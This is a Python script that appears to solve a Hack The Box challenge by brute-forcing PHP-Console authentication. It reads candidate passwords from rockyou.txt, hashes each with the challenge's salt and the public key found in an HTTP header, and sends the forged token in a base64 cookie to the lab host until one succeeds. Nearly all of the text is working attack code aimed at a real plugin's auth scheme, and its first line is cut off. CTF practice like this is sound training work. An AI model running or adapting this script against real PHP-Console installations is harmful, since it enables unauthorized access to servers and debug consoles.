ort requests
from hashlib import sha256
from base64 import b64encode
import json
	
url = "http://docker.hackthebox.eu:31828"
	
# publickey found in the PHP-Console HTTP header
publickey = "d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e"
	
# Open rockyou.txt file in read mode
file = open("./rockyou.txt","r")
	
# Create for loop to iterate through each entry in rockyou.txt
for x in range(1000):
   word = file.readline().strip()
	
   # For every line in rockyou.txt, append the salt to prepare to later create the hash
   password = word + "NeverChangeIt:)"
	
   # return hash('sha256', $string);
   # In the auth.php, it uses sha256 to create the hash using the string + salt.
   hash = sha256(password.encode()).hexdigest()
	
   # return $this->hash($this->passwordHash . $this->getPublicKey());
   # Also it uses the sha256 salted hash with the publickey to generate another sha256 hash for the token.
   token = sha256((hash + publickey).encode()).hexdigest()
	
   # Now start putting together the HTTP GET request starting with the HTTP header paramters
   phpconsoleclient = '{"php-console-client":5,"auth":{"publicKey":"d1d58b2f732fd546d9507da275a71bddc0c2300a214af3f3f3a5f5f249fe275e","token":"' + str(token) + '"}}'
	
   # The original GET request has encoded php-console-client into base64, this step is doing the same thing. The decode function changes the object type
   # from bytes to string.
   phpconsoleclient = b64encode(phpconsoleclient.encode()).decode()
	
   # Add all the cookies required in the original GET request.
   cookies = 'php-console-server=5; php-console-client=' + str(phpconsoleclient)
	
   # Create a python dictionary object to store the header parameters
   headers = { 'Cookie' : cookies }
	
   # Create HTTP GET request with url and HTTP headers
   r = requests.get(url, headers=headers)
	
   # Append php-console to the GET request HTTP header
   phpconsoleclient = r.headers['PHP-Console']
   phpconsoleclient = json.loads(phpconsoleclient)
	
   # Print the word in the current interation when isSuccess equals to True. This is the word that will allow access to PHP-Console chrome plugin.
   status = phpconsoleclient["auth"]["isSuccess"]
   if(status != False):
       print(word)
       break
	
# close rockyou.txt
file.close()
